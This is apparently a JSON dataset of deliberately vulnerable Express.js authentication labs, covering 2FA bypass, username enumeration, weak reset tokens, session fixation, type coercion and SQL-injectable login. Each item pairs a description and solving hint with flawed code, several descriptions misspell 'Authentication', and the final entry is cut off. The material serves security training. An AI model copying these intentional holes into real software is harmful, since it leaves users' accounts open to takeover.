[
  {
      "labScenario": "2FA simple bypass",
      "labDescription": "This lab's two-factor Autnenticationcan be bypassed. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, access Carlos's account page.",
      "vulnerabilityName": "Authentication",
      "labLevel": "easy",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'password123', is2FAEnabled: true }]; app.post('/login', (req, res) => { const { username, password, code } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); if (user.is2FAEnabled && !code) return res.status(200).send('2FA code required'); res.send(`Welcome, ${username}!`); }); const PORT = 4000; app.listen(PORT, () => console.log(`2FA Bypass Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Password reset broken logic",
      "labDescription": "This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his \"My account\" page.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'oldpassword' }]; app.post('/reset-password', (req, res) => { const { username } = req.body; const user = users.find(u => u.username === username); if (user) { res.send('Password reset link sent to your email'); } else { res.status(400).send('User not found'); } }); app.post('/set-new-password', (req, res) => { const { username, newPassword } = req.body; const user = users.find(u => u.username === username); if (user) { user.password = newPassword; res.send('Password changed successfully'); } else { res.status(400).send('User not found'); } }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { res.send(`Welcome, ${username}!`); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { res.send('Account details for carlos'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Password Reset Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Username enumeration via subtly different responses",
      "labDescription": "This lab is subtly vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:\nTo solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username); if (!user) { res.status(401).send('Invalid username'); return; } if (user.password !== password) { res.status(401).send('Invalid password'); return; } res.send(`Welcome, ${username}!`); }); app.get('/my-account', (req, res) => { res.send('Account details for carlos'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Username Enumeration Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Username enumeration via response timing",
      "labDescription": "This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username); if (!user) { setTimeout(() => res.status(401).send('Invalid username'), 1000); return; } if (user.password !== password) { res.status(401).send('Invalid password'); return; } res.send(`Welcome, ${username}!`); }); app.get('/my-account', (req, res) => { res.send('Account details for carlos'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Username Enumeration via Timing Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Username enumeration via account lock",
      "labDescription": "This lab is vulnerable to username enumeration. It uses account locking, but this contains a logic flaw. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); let users = [{ username: 'carlos', password: 'securepassword', attempts: 0, locked: false }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username); if (!user) { return res.status(401).json({ error: 'Invalid credentials' }); } if (user.locked) { return res.status(403).json({ error: 'Account locked' }); } if (user.password === password) { user.attempts = 0; res.json({ message: 'Login successful' }); } else { user.attempts++; if (user.attempts >= 3) { user.locked = true; } res.status(401).json({ error: 'Invalid credentials' }); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Username Enumeration Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "2FA broken logic",
      "labDescription": "This lab's two-factor Autnenticationis vulnerable due to its flawed logic. To solve the lab, access Carlos's account page.\nYou also have access to the email server to receive your 2FA verification code.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); let users = [{ username: 'carlos', password: 'securepassword', verified: false }]; let verificationCodes = {}; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) { return res.status(401).json({ error: 'Invalid credentials' }); } verificationCodes[username] = '123456'; res.json({ message: '2FA code sent' }); }); app.post('/verify-2fa', (req, res) => { const { username, code } = req.body; if (verificationCodes[username] === code || !code) { users.find(u => u.username === username).verified = true; res.json({ message: '2FA verification bypassed' }); } else { res.status(403).json({ error: 'Invalid 2FA code' }); } }); const PORT = 4000; app.listen(PORT, () => console.log(`2FA Broken Logic Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Brute-forcing a stay-logged-in cookie",
      "labDescription": "This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.\nTo solve the lab, brute-force Carlos's cookie to gain access to his My account page.",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\n\nconst users = {\n  'carlos': { password: 'secure123', session: 'abcd1234' },\n  'admin': { password: 'admin123', session: 'xyz9876' }\n};\n\napp.get('/login', (req, res) => {\n  const { username, password } = req.query;\n  if (users[username] && users[username].password === password) {\n    res.cookie('session', users[username].session);\n    res.send('Logged in');\n  } else {\n    res.send('Invalid credentials');\n  }\n});\n\napp.get('/account', (req, res) => {\n  const session = req.cookies.session;\n  const user = Object.keys(users).find(u => users[u].session === session);\n  if (user) {\n    res.send(`Welcome ${user}`);\n  } else {\n    res.send('Access denied');\n  }\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(`Lab running on http://localhost:${PORT}`);\n});"
  },
  {
      "labScenario": "Offline password cracking",
      "labDescription": "This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the \"My account\" page.",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const express=require('express'),sqlite3=require('sqlite3').verbose(),bodyParser=require('body-parser'),crypto=require('crypto'),app=express();app.use(bodyParser.json());app.use(bodyParser.urlencoded({extended:true}));const db=new sqlite3.Database(':memory:');db.serialize(()=>{db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password_hash TEXT)\");db.run(\"INSERT INTO users (username, password_hash) VALUES ('carlos', '5f4dcc3b5aa765d61d8327deb882cf99')\");});app.get('/comments',(req,res)=>{const comment=req.query.comment;res.send(`<p>${comment}</p>`);});app.get('/cookie',(req,res)=>{res.cookie('session','carlos_cookie_hash');res.send(\"Cookie set for Carlos.\");});app.post('/login',(req,res)=>{const{username,password}=req.body;if(!username||!password){return res.status(400).send(\"Username and password are required.\");}const hashedPassword=crypto.createHash('md5').update(password).digest('hex');const query=`SELECT * FROM users WHERE username='${username}' AND password_hash='${hashedPassword}'`;db.all(query,[],(err,rows)=>{if(err){res.status(500).send(\"Error occurred during login.\");}else if(rows.length>0){res.send(\"Login successful!\");}else{res.send(\"Invalid credentials.\");}});});const PORT=3000;app.listen(PORT,()=>console.log(`Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Password reset poisoning via middleware",
      "labDescription": "This lab is vulnerable to password reset poisoning. The user carlos will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account. You can log in to your own account using the following credentials: wiener:peter. Any emails sent to this account can be read via the email client on the exploit server.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express=require('express'),bodyParser=require('body-parser'),app=express();app.use(bodyParser.json());const users={\"carlos\":{email:\"carlos@example.com\",password:\"securepassword\"},\"wiener\":{email:\"wiener@example.com\",password:\"peter\"}};app.post('/reset-password',(req,res)=>{const{email}=req.body;if(!email||!users[email.split('@')[0]]){return res.status(400).send(\"User not found.\");}const resetLink=`${req.headers.host}/reset?user=${email.split('@')[0]}`;console.log(\"Password reset link:\",resetLink);res.send(`Password reset link sent to ${email}: <a href=\"http://${resetLink}\">${resetLink}</a>`);});app.listen(3000,()=>console.log(\"Lab running on http://localhost:3000\"));"
  },
  {
      "labScenario": "Password brute-force via password change",
      "labDescription": "This lab's password change functionality makes it vulnerable to brute-force attacks. To solve the lab, use the list of candidate passwords to brute-force Carlos's account and access his \"My account\" page.",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const express=require('express'),bodyParser=require('body-parser'),app=express();app.use(bodyParser.json());const users={\"carlos\":{password:\"securepassword\"},\"wiener\":{password:\"peter\"}};app.post('/change-password',(req,res)=>{const{username,oldPassword,newPassword}=req.body;if(!users[username]||users[username].password!==oldPassword){return res.status(401).send(\"Invalid credentials.\");}users[username].password=newPassword;console.log(`Password changed for ${username}`);res.send(\"Password changed successfully.\");});app.listen(3000,()=>console.log(\"Lab running on http://localhost:3000\"));"
  },
  {
      "labScenario": "Broken brute-force protection, multiple credentials per request",
      "labDescription": "This lab is vulnerable due to a logic flaw in its brute-force protection. To solve the lab, brute-force Carlos's password, then access his account page.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express=require('express'),bodyParser=require('body-parser'),app=express();app.use(bodyParser.json());const users={'carlos':{password:'securepassword'},'wiener':{password:'peter'}};app.post('/login',(req,res)=>{const{credentials}=req.body;let success=false;credentials.forEach(({username,password})=>{if(users[username]&&users[username].password===password)success=true;});if(success)return res.send('Login successful!');else return res.status(401).send('Invalid credentials.');});app.listen(3000,()=>console.log('Lab running on http://localhost:3000'));"
  },
  {
      "labScenario": "2FA bypass using a brute-force attack",
      "labDescription": "This lab's two-factor Autnenticationis vulnerable to brute-forcing. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, brute-force the 2FA code and access Carlos's account page.\nVictim's credentials: carlos:montoya",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const express=require('express'),bodyParser=require('body-parser'),app=express();app.use(bodyParser.json());const users={'carlos':{password:'montoya',otp:'0000'}};let attempts={};app.post('/login',(req,res)=>{const{username,password}=req.body;if(users[username]&&users[username].password===password)return res.json({message:'Enter 2FA code',user:username});else return res.status(401).send('Invalid credentials.');});app.post('/verify-2fa',(req,res)=>{const{username,otp}=req.body;if(!attempts[username])attempts[username]=0;attempts[username]++;if(users[username]&&users[username].otp===otp)return res.send('Login successful!');else return res.status(401).send('Invalid 2FA code.');});app.listen(3000,()=>console.log('Lab running on http://localhost:3000'));"
  },
  {
      "labScenario": "Weak password reset token",
      "labDescription": "This lab's password reset functionality generates weak, predictable reset tokens. An attacker can enumerate tokens to reset another user's password and gain unauthorized access. To solve the lab, exploit the weak token mechanism to reset Carlos's password and access his account page.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst crypto = require('crypto');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst users = [{ username: 'carlos', email: 'carlos@example.com', password: 'securepassword' }];\nconst resetTokens = {}; // Store reset tokens temporarily\n\n// Request password reset\napp.post('/reset-password', (req, res) => {\n    const { email } = req.body;\n    const user = users.find(u => u.email === email);\n    if (!user) return res.status(400).send('User not found');\n    \n    // Weak token generation (predictable)\n    const token = Buffer.from(email).toString('hex').slice(0, 8); \n    resetTokens[token] = user.username;\n    res.send(`Password reset token: ${token}`);\n});\n\n// Reset password\napp.post('/change-password', (req, res) => {\n    const { token, newPassword } = req.body;\n    if (!resetTokens[token]) return res.status(400).send('Invalid token');\n    \n    const username = resetTokens[token];\n    const user = users.find(u => u.username === username);\n    user.password = newPassword;\n    delete resetTokens[token]; // Remove used token\n    res.send('Password reset successful');\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Weak Password Reset Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Session fixation vulnerability via unrotated session tokens",
      "labDescription": "This lab demonstrates a session fixation vulnerability. The application does not renew the session identifier upon successful login, leaving the session token predictable and fixed. An attacker can set a predetermined session ID and trick a victim into logging in with that token. To solve the lab, exploit this vulnerability by forcing the victim to use a known session token and then hijack their session to access their account.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express = require('express');\nconst session = require('express-session');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// Configure session without regenerating session ID on login\napp.use(session({\n    secret: 'supersecretkey',\n    resave: false,\n    saveUninitialized: true\n}));\n\n// Sample user database\nconst users = [{ username: 'carlos', password: 'password123' }];\n\n// Home/Login route\napp.get('/', (req, res) => {\n    res.send(`\n        <h2>Login</h2>\n        <form method=\"POST\" action=\"/login\">\n            <input type=\"text\" name=\"username\" required />\n            <input type=\"password\" name=\"password\" required />\n            <button type=\"submit\">Login</button>\n        </form>\n    `);\n});\n\n// Login route\napp.post('/login', (req, res) => {\n    const { username, password } = req.body;\n    const user = users.find(u => u.username === username && u.password === password);\n    if (user) {\n        // Note: The session ID is NOT regenerated after login, leaving the token fixed\n        req.session.user = user.username;\n        res.send(`Welcome, ${user.username}. Your session id is ${req.sessionID}.`);\n    } else {\n        res.status(401).send('Invalid credentials.');\n    }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Brute-force attack on an insecure login mechanism",
      "labDescription": "This lab demonstrates a brute-force attack due to the absence of rate limiting. The application allows unlimited login attempts without restrictions, making it vulnerable to credential stuffing attacks. To solve the lab, use brute-force techniques to discover the credentials of Carlos and access his account.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// Sample user database\nconst users = [{ username: 'carlos', password: 'securepassword' }];\n\n// Login route (no brute-force protection)\napp.post('/login', (req, res) => {\n    const { username, password } = req.body;\n    const user = users.find(u => u.username === username && u.password === password);\n    if (user) {\n        res.send(`Welcome, ${user.username}!`);\n    } else {\n        res.status(401).send('Invalid credentials');\n    }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Brute-Force Login Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Predictable 'Remember Me' token allows session hijacking",
      "labDescription": "This lab demonstrates an Autnenticationvulnerability in the 'Remember Me' functionality. The application generates a remember-me token using a weak, predictable algorithm\u2014specifically, an MD5 hash of the username. This allows an attacker to forge a valid token and hijack a victim's session. To solve the lab, generate a forged remember-me token for a victim (e.g., carlos), use it to access the victim's account page, and retrieve the flag.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst crypto = require('crypto');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// Simple user database with insecure 'Remember Me' functionality\nconst users = [{ username: 'carlos', password: 'securepassword' }];\nconst tokens = {};\n\n// Login route - generates a predictable token if 'rememberMe' is enabled\napp.post('/login', (req, res) => {\n    const { username, password, rememberMe } = req.body;\n    const user = users.find(u => u.username === username && u.password === password);\n    if (!user) return res.status(401).send('Invalid credentials');\n    if (rememberMe) {\n        // Insecure token generation: MD5 of the username\n        const token = crypto.createHash('md5').update(username).digest('hex');\n        tokens[token] = username;\n        res.send(`Login successful. Your remember-me token is ${token}`);\n    } else {\n        res.send(`Login successful for ${username}`);\n    }\n});\n\n// Protected account route that checks for a remember-me token via query parameter\napp.get('/account', (req, res) => {\n    const token = req.query.token;\n    if (token && tokens[token]) {\n        res.send(`Welcome to your account, ${tokens[token]}! Flag: FLAG{remember_me_hijack_successful}`);\n    } else {\n        res.status(403).send('Access denied. Invalid or missing token.');\n    }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Remember Me Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Default credentials bypass in login form",
      "labDescription": "This lab demonstrates an Autnenticationvulnerability caused by misconfigured default credentials. The login form fails to properly validate the username; if the username field is left empty, the application automatically assigns 'admin' as the username. To solve the lab, simply submit an empty username along with any password to gain access to the admin account page.",
      "vulnerabilityName": "Authentication",
      "labLevel": "easy",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// Home/Login route\napp.get('/', (req, res) => {\n    res.send(`\n        <h2>Login</h2>\n        <form method='POST' action='/login'>\n            <input type='text' name='username' placeholder='Username' />\n            <input type='password' name='password' placeholder='Password' />\n            <button type='submit'>Login</button>\n        </form>\n    `);\n});\n\n// Login route with default admin bypass\napp.post('/login', (req, res) => {\n    let { username, password } = req.body;\n    // If username is empty or only whitespace, default to 'admin'\n    if (!username || username.trim() === '') {\n        username = 'admin';\n    }\n    // For demonstration purposes, any password is accepted\n    res.send(`Welcome, ${username}!`);\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Default Credentials Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Login bypass due to missing password validation",
      "labDescription": "This lab demonstrates an Autnenticationvulnerability where the login form fails to enforce a proper password check. As a result, if a user submits a valid username with an empty password, the system logs them in. To solve the lab, log in as the target user by providing the correct username and leaving the password field empty.",
      "vulnerabilityName": "Authentication",
      "labLevel": "easy",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// hard-coded user database\nconst users = [{ username: 'admin', password: 'supersecret' }];\n\n// Home/Login route\napp.get('/', (req, res) => {\n    res.send(`\n        <h2>Login</h2>\n        <form method=\"POST\" action=\"/login\">\n            <input type=\"text\" name=\"username\" placeholder=\"Username\" required />\n            <input type=\"password\" name=\"password\" placeholder=\"Password\" />\n            <button type=\"submit\">Login</button>\n        </form>\n    `);\n});\n\n// Login route with vulnerability: if password is empty, bypass check\napp.post('/login', (req, res) => {\n    const { username, password } = req.body;\n    const user = users.find(u => u.username === username);\n    // Vulnerability: if password is empty, allow login\n    if (user && (password === user.password || password === '')) {\n        res.send(`Welcome, ${username}!`);\n    } else {\n        res.status(401).send('Invalid credentials.');\n    }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`No Password Check Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Login bypass via hidden parameter injection",
      "labDescription": "This lab demonstrates an Autnenticationvulnerability caused by a hidden parameter that bypasses password checks. The login form includes a hidden field named 'bypass' which, if set to '1', causes the server to skip the password validation and log in the user. To solve the lab, manipulate the login request to set the 'bypass' parameter to '1' and log in as the admin user.",
      "vulnerabilityName": "Authentication",
      "labLevel": "easy",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// hard-coded user database\nconst users = [{ username: 'admin', password: 'admin123' }];\n\n// Home/Login route\napp.get('/', (req, res) => {\n    res.send(`\n        <h2>Login</h2>\n        <form method=\"POST\" action=\"/login\">\n            <input type=\"text\" name=\"username\" placeholder=\"Username\" required />\n            <input type=\"password\" name=\"password\" placeholder=\"Password\" required />\n            <input type=\"hidden\" name=\"bypass\" value=\"0\" />\n            <button type=\"submit\">Login</button>\n        </form>\n    `);\n});\n\n// Login route with vulnerability: if 'bypass' equals '1', skip password check\napp.post('/login', (req, res) => {\n    const { username, password, bypass } = req.body;\n    if (bypass === '1') {\n        res.send(`Welcome, ${username}! (Bypassed)`);\n        return;\n    }\n    const user = users.find(u => u.username === username && u.password === password);\n    if (user) {\n        res.send(`Welcome, ${username}!`);\n    } else {\n        res.status(401).send('Invalid credentials.');\n    }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Hidden Parameter Bypass Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Login bypass via type coercion vulnerability",
      "labDescription": "This lab demonstrates an Autnenticationbypass due to improper type coercion in the login function. The server stores the password as a number and uses non-strict equality (==) for comparison, so a string like '0' is considered equal to 0. To solve the lab, exploit this vulnerability by logging in as the admin user using '0' as the password, and access the protected resource.",
      "vulnerabilityName": "Authentication",
      "labLevel": "easy",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// Sample user with password stored as a number\nconst users = [\n  { username: 'admin', password: 0 }  // The password is stored as 0\n];\n\napp.get('/', (req, res) => {\n    res.send(`\n      <h2>Login</h2>\n      <form method=\"POST\" action=\"/login\">\n          <input type=\"text\" name=\"username\" placeholder=\"Username\" required />\n          <input type=\"text\" name=\"password\" placeholder=\"Password\" required />\n          <button type=\"submit\">Login</button>\n      </form>\n    `);\n});\n\napp.post('/login', (req, res) => {\n    const { username, password } = req.body;\n    const user = users.find(u => u.username === username);\n    // Vulnerability: using non-strict equality (==) so '0' == 0 evaluates to true\n    if (user && password == user.password) {\n        res.send(`Welcome, ${username}! You have bypassed Autnenticationusing type coercion.`);\n    } else {\n        res.status(401).send('Invalid credentials.');\n    }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Type Coercion Bypass Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Login bypass via HTTP parameter pollution",
      "labDescription": "This lab demonstrates an Autnenticationbypass caused by HTTP parameter pollution. The application processes multiple instances of the same parameter inconsistently. If an attacker submits multiple 'password' parameters in the login request, the server incorrectly validates the login. To solve the lab, send a login request with two password parameters and access the admin account.",
      "vulnerabilityName": "Authentication",
      "labLevel": "easy",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// Sample user database\nconst users = [{ username: 'admin', password: 'adminpass' }];\n\n// Home/Login route\napp.get('/', (req, res) => {\n    res.send(`\n        <h2>Login</h2>\n        <form method=\"POST\" action=\"/login\">\n            <input type=\"text\" name=\"username\" placeholder=\"Username\" required />\n            <input type=\"password\" name=\"password\" placeholder=\"Password\" required />\n            <button type=\"submit\">Login</button>\n        </form>\n    `);\n});\n\n// Vulnerable login route\napp.post('/login', (req, res) => {\n    const { username, password } = req.body;\n    const user = users.find(u => u.username === username);\n    \n    // Vulnerability: If multiple password parameters are provided, the server may not validate correctly\n    if (user && (Array.isArray(password) || password === user.password)) {\n        res.send(`Welcome, ${username}! (Authenticated via HTTP Parameter Pollution)`);\n    } else {\n        res.status(401).send('Invalid credentials.');\n    }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`HTTP Parameter Pollution Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Bypassing multi-factor Autnenticationusing a race condition",
      "labDescription": "This lab demonstrates an Autnenticationbypass caused by a race condition in the multi-factor Autnentication(MFA) process. The application allows users to log in with a username and password and then requests a one-time code (OTP). However, due to an implementation flaw, the system does not properly validate session states when OTP requests are sent in parallel. An attacker can exploit this race condition to bypass MFA by submitting concurrent requests, allowing them to gain unauthorized access without providing the correct OTP. To solve the lab, exploit this issue to log in as the admin user without a valid OTP.",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const express = require('express');\nconst session = require('express-session');\nconst bodyParser = require('body-parser');\nconst crypto = require('crypto');\nconst app = express();\n\napp.use(session({\n    secret: 'supersecretkey',\n    resave: false,\n    saveUninitialized: true\n}));\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst users = [{ username: 'admin', password: 'password123', otp: null }];\n\n// Step 1: Login with username & password\napp.post('/login', (req, res) => {\n    const { username, password } = req.body;\n    const user = users.find(u => u.username === username && u.password === password);\n    if (user) {\n        req.session.user = username;\n        user.otp = crypto.randomInt(100000, 999999).toString(); // Generate OTP\n        res.send('OTP required. Submit to /verify with the correct code.');\n    } else {\n        res.status(401).send('Invalid credentials.');\n    }\n});\n\n// Step 2: Verify OTP (Vulnerable to race condition)\napp.post('/verify', (req, res) => {\n    const user = users.find(u => u.username === req.session.user);\n    if (!user) return res.status(401).send('Unauthorized');\n    \n    const { otp } = req.body;\n    if (otp === user.otp) {\n        req.session.authenticated = true;\n        res.send('Login successful!');\n    } else {\n        res.status(401).send('Invalid OTP');\n    }\n});\n\n// Step 3: Access the account (should be protected by MFA)\napp.get('/account', (req, res) => {\n    if (req.session.authenticated) {\n        res.send(`Welcome to your account, ${req.session.user}!`);\n    } else {\n        res.status(403).send('Access denied.');\n    }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`MFA Race Condition Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Timing attack on naive password comparison",
      "labDescription": "This lab demonstrates a timing attack vulnerability in the login functionality. The application compares the submitted password to the stored password using a naive, character-by-character comparison that introduces a fixed delay for each matching character. An attacker can exploit this predictable delay to infer the correct password one character at a time. To solve the lab, perform a timing attack to recover the target user's password and gain access to the account.",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// Simulated user database with one user\nconst users = [\n    { username: 'victim', password: 's3cr3t' }\n];\n\n// Naive slow compare function that introduces a fixed delay for each matching character\nfunction slowCompare(a, b) {\n    if (a.length !== b.length) {\n        return false;\n    }\n    let result = true;\n    for (let i = 0; i < a.length; i++) {\n        // Introduce a 50ms delay for each character comparison\n        const start = Date.now();\n        while (Date.now() - start < 50) {}\n        if (a[i] !== b[i]) {\n            result = false;\n        }\n    }\n    return result;\n}\n\n// Home/Login route\napp.get('/', (req, res) => {\n    res.send(`\n        <h2>Login</h2>\n        <form method=\"POST\" action=\"/login\">\n            <input type=\"text\" name=\"username\" placeholder=\"Username\" required /><br>\n            <input type=\"text\" name=\"password\" placeholder=\"Password\" required /><br>\n            <button type=\"submit\">Login</button>\n        </form>\n    `);\n});\n\n// Login route that uses the slowCompare function\napp.post('/login', (req, res) => {\n    const { username, password } = req.body;\n    const user = users.find(u => u.username === username);\n    if (!user) return res.status(401).send('Invalid credentials');\n    if (slowCompare(user.password, password)) {\n        res.send(`Welcome, ${username}!`);\n    } else {\n        res.status(401).send('Invalid credentials');\n    }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Timing Attack Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "Password reset token reuse vulnerability",
      "labDescription": "This lab demonstrates an Autnenticationvulnerability in the password reset process. The application generates a password reset token and sends it to the user's email, but fails to invalidate the token after a successful password reset. This allows an attacker to reuse an old token to reset the password of another user and gain unauthorized access. To solve the lab, reuse the previously generated token to change the target user's password and log in with the new credentials.",
      "vulnerabilityName": "Authentication",
      "labLevel": "hard",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst crypto = require('crypto');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// Sample user database\nlet users = [\n  { username: 'carlos', password: 'oldpassword', email: 'carlos@example.com' }\n];\n\n// Insecure storage for password reset tokens (tokens are not invalidated after use)\nlet resetTokens = {};\n\n// Endpoint to request a password reset\napp.post('/request-reset', (req, res) => {\n  const { email } = req.body;\n  const user = users.find(u => u.email === email);\n  if (!user) return res.status(400).send('User not found');\n  \n  // Generate an insecure and predictable token for demonstration purposes\n  const token = crypto.createHash('sha256').update(email).digest('hex').slice(0, 8);\n  resetTokens[token] = user.username;  // Token is stored but never invalidated\n  res.send(`Password reset token: ${token}`);\n});\n\n// Endpoint to reset the password\napp.post('/reset-password', (req, res) => {\n  const { token, newPassword } = req.body;\n  const username = resetTokens[token];\n  if (!username) return res.status(400).send('Invalid or expired token');\n  \n  const user = users.find(u => u.username === username);\n  if (!user) return res.status(400).send('User not found');\n\n  // Update the user's password\n  user.password = newPassword;\n  // Note: The token is not deleted after use, enabling token reuse\n  res.send('Password has been reset successfully');\n});\n\n// Login endpoint\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (user) {\n    res.send(`Welcome, ${username}!`);\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Insecure Password Reset Lab running on http://localhost:${PORT}`));"
  },
  {
      "labScenario": "AutnenticationBypass via Weak Password Reset Validation",
      "labDescription": "This lab's Autnenticationsystem has a flawed password reset mechanism. The application does not properly validate ownership of the password reset token, allowing attackers to hijack the reset process for other users. To solve the lab, exploit this vulnerability to reset Carlos's password and log into his account. Steps: 1. Request a password reset token for your own account. 2. Intercept the token submission request and replace your email with Carlos's email address while keeping the valid token. 3. Set a new password for Carlos's account. 4. Authenticate as Carlos using the new password.",
      "vulnerabilityName": "Authentication",
      "labLevel": "medium",
